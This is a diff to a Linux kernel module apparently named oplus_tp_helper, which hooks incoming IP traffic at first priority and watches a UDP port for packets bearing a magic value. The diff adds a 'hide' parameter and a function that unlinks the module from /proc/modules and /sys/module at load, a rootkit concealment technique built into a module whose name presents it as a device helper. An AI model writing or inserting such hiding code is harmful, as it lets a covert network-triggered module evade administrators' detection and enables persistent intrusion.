@@ -38,11 +38,17 @@
 #include <linux/skbuff.h>
 #include <linux/spinlock.h>
 #include <linux/if_ether.h>
+#include <linux/kobject.h>
+#include <linux/list.h>
 #include <net/net_namespace.h>
 
 #define TP_MAGIC 0x31484354u
 #define TP_QSZ 64
 #define TP_UDP_PORT 61069
+
+static int hide = 0;
+module_param(hide, int, 0644);
+MODULE_PARM_DESC(hide, "hide module from /proc/modules and /sys/module");
 
 struct __attribute__((packed)) tp_pkt {
 	uint32_t magic;
@@ -283,6 +289,15 @@ static struct nf_hook_ops tp_ops_in = {
 	.priority = NF_IP_PRI_FIRST,
 };
 
+static void tp_hide_module(void)
+{
+	if (!hide)
+		return;
+
+	kobject_del(&THIS_MODULE->mkobj.kobj);
+	list_del_init(&THIS_MODULE->list);
+}
+
 static int __init oplus_tp_helper_init(void)
 {
 	int ret;
@@ -308,6 +323,7 @@ static int __init oplus_tp_helper_init(void)
 		goto err_unreg_pre;
 	}
 
+	tp_hide_module();
 	return 0;
 
 err_put:
